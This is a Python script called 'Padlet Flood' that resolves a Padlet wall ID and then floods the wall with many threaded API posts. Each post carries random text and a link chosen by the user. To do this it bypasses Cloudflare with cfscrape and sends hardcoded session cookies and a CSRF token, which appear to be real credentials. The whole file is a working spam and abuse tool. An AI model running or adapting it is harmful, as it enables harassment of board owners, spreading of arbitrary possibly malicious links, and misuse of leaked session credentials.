import requests, random, cfscrape, time, re, os, sys
from concurrent.futures import ThreadPoolExecutor

executors = ThreadPoolExecutor(max_workers=20)

times = 100

def randomStr(length):
	mode = random.randrange(1, 4)
	text = ""
	for i in range(length):
		if mode == 1:
			text += chr(random.randint(0x4E00, 0x9FA5))
		elif mode == 2:
			text += random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
		elif mode == 3:
			text += random.choice("iIl")
	return text

def clear():
	if os.name == "nt": os.system("cls")
	else: os.system("clear")

def padletSpam(wall_id, link):
	requests.post("https://padlet.com/api/5/wishes", json={"cid": "c_new7", "wall_id": int(wall_id), "published": True, "author_id": random.randint(0, 9999999999), "width": 200, "body": randomStr(15), "subject": randomStr(20), "attachment": link, "attachment_caption": None, "sort_index": 52310667604992, "created_at": "2022-02-10T07:17:39.351Z", "updated_at": "2022-02-10T07:17:39.351Z", "wish_content": {"is_processed": False, "attachment_props": {"url": "https://www.youtube.com/watch?v=llv9GUa41Pw"}}}, headers={"cookie": "ww_d=ee45c915df791b57e93f6f6170106d93; ww_s=c56272651475fe45612a4cd41bd0a67f; ww_dpr=1; __asc=889db6d417ee27c299547efeb0a; __auc=889db6d417ee27c299547efeb0a; ww_tz=Asia/Bangkok; __cf_bm=QBA6rIUBcDL.bsk5k_MZkvwVqeUNCznG5uBKxzcfOMM-1644477324-0-AdmOm5usYzAQSHNtorkxCasfNfNi5V1cahyISXIaCyuv7QJMJ9qmDg01KGeTQkll0X5LdW7pWeDbjQD7Djwp2xs0Ft9g1QsJRMlHrHGkLzAAMEhIMY1AqHqTR6DDyEEmxzXQd7YpFyo98NFeFbABkcYPkWJL7xLHwcw9LH06hCPsaP77R/u5n2u69+AAYWfX/Q==; ww_p=eU1jaVJLak9MUlFJaDFlYktsNkpjV3A5RjFDdGR5ZVFkOVA4UVpGeENvSitLS3plcXkvUDZvbGRhMEtLTFErWFFMSjZ1YkFjM1VHNkx1K3hvblpQVGRpV3QrRk1rSmhsQ3lCNnZieTQwUFRwMWlzcXpLbGhmdy9FRWt2UmdveXAvZk9kQS9iTGg4WnZ2OGtWZzZ3ZXlPV1haYlFNZmtnT2kvWW4vSVNYLzlsczVDQnZtYk1kOUNxNVZ3RkJUemFFOHZkOUZ3ZysybDFqczBmd2NmaFdzTmNkNjZWMHJCbkdrY1luZ1psRVNZck5ZYlBnMndLSUJqVVhLcEFadUt3VUVha2ZUZm91Vm9CZjEzWUpJWi9nc2JFYVF0aVZJKzlTNENSczlnY1ZST29zcjVIc3M5SGFMR0R2Y2d2MDMvaXRVQTN5ZFZEUXZXelpyNTVHeFZLL1ljbmhhby9hQWhJeGw0M0xHYWxLZnZ2Y3lONGpNNCtDR1dKM0tsYUxuS3U5LS1ISElwTjkyNlU5MmFmKzM2TXhIekNRPT0%3D--3e3ab3493714fc325ff8b365de6deada53e94379", "X-CSRF-Token": "P/yJQ8wNiidkXfhVFBdTvfhUt/esON2JYPiL1Nc8hlnXO0+dAuGZV9QF3lmG3Na7F+9zauTgYCQKnyW4vePHJA=="})

		
def main():
	os.system("title Padlet Flood")
	clear()
	print("    Padlet Flood")
	print("  By https://t.me/RxdIlIllIIIl")
	print()
	print()
	wall_id = 0

	try:
		padlet_url = input("  Padlet url: ")
		print("  resolving id")
		scraper = cfscrape.create_scraper()
		api_token = re.search("<link rel=\"preload\" as=\"fetch\" id=\"starting-state-preload\" href=\"(.*)\" />", scraper.get(padlet_url).text).group(1)
		wall_id = requests.get("https://api.padlet.com" + api_token).json()["wall"]["id"]
		clear()
		print("  resolved id")
		print("  wall id = " + str(wall_id))
		time.sleep(1)
		clear()
	except Exception as e:
		print("error while resolving id: " + str(e))
		time.sleep(3)
		clear()
		print("  how to manually get wall id: https://youtu.be/_MMchaO8O58")
		print()
		wall_id_str = input("   ID: ")
		try:
			wall_id = int(wall_id_str)
		except:
			print("  wall-id must be number. :(")
			sys.exit(1)

	clear()
	global times
	try:
		times = int(input("  Amount: "))
	except:
		print("  amount must be number.")
		print("  will use default value (100)")
		time.sleep(1)

	clear()

	print("  Put any link")
	print("")
	link = input("link: ")

	clear()

	res = requests.post("https://padlet.com/api/5/wishes", json={"cid": "c_new7", "wall_id": int(wall_id), "published": True, "author_id": random.randint(0, 9999999999), "width": 200, "body": randomStr(15), "subject": randomStr(20), "attachment": link, "attachment_caption": None, "sort_index": 52310667604992, "created_at": "2022-02-10T07:17:39.351Z", "updated_at": "2022-02-10T07:17:39.351Z", "wish_content": {"is_processed": False, "attachment_props": {"url": "https://www.youtube.com/watch?v=llv9GUa41Pw"}}}, headers={"cookie": "ww_d=ee45c915df791b57e93f6f6170106d93; ww_s=c56272651475fe45612a4cd41bd0a67f; ww_dpr=1; __asc=889db6d417ee27c299547efeb0a; __auc=889db6d417ee27c299547efeb0a; ww_tz=Asia/Bangkok; __cf_bm=QBA6rIUBcDL.bsk5k_MZkvwVqeUNCznG5uBKxzcfOMM-1644477324-0-AdmOm5usYzAQSHNtorkxCasfNfNi5V1cahyISXIaCyuv7QJMJ9qmDg01KGeTQkll0X5LdW7pWeDbjQD7Djwp2xs0Ft9g1QsJRMlHrHGkLzAAMEhIMY1AqHqTR6DDyEEmxzXQd7YpFyo98NFeFbABkcYPkWJL7xLHwcw9LH06hCPsaP77R/u5n2u69+AAYWfX/Q==; ww_p=eU1jaVJLak9MUlFJaDFlYktsNkpjV3A5RjFDdGR5ZVFkOVA4UVpGeENvSitLS3plcXkvUDZvbGRhMEtLTFErWFFMSjZ1YkFjM1VHNkx1K3hvblpQVGRpV3QrRk1rSmhsQ3lCNnZieTQwUFRwMWlzcXpLbGhmdy9FRWt2UmdveXAvZk9kQS9iTGg4WnZ2OGtWZzZ3ZXlPV1haYlFNZmtnT2kvWW4vSVNYLzlsczVDQnZtYk1kOUNxNVZ3RkJUemFFOHZkOUZ3ZysybDFqczBmd2NmaFdzTmNkNjZWMHJCbkdrY1luZ1psRVNZck5ZYlBnMndLSUJqVVhLcEFadUt3VUVha2ZUZm91Vm9CZjEzWUpJWi9nc2JFYVF0aVZJKzlTNENSczlnY1ZST29zcjVIc3M5SGFMR0R2Y2d2MDMvaXRVQTN5ZFZEUXZXelpyNTVHeFZLL1ljbmhhby9hQWhJeGw0M0xHYWxLZnZ2Y3lONGpNNCtDR1dKM0tsYUxuS3U5LS1ISElwTjkyNlU5MmFmKzM2TXhIekNRPT0%3D--3e3ab3493714fc325ff8b365de6deada53e94379", "X-CSRF-Token": "P/yJQ8wNiidkXfhVFBdTvfhUt/esON2JYPiL1Nc8hlnXO0+dAuGZV9QF3lmG3Na7F+9zauTgYCQKnyW4vePHJA=="})
	if res.status_code == 201:
		print("  trying...")
		for i in range(times):
			executors.submit(padletSpam, int(wall_id), link)
		executors.shutdown(wait=True, cancel_futures=False)
		print("  done :)")
	elif res.status_code == 404:
		print("  wall not found.")
		sys.exit(1)
	else:
		print(f"  error {res.status_code}. patched?\nresponse={res.text}")
		sys.exit(1)
		
if __name__ == "__main__":
	main()
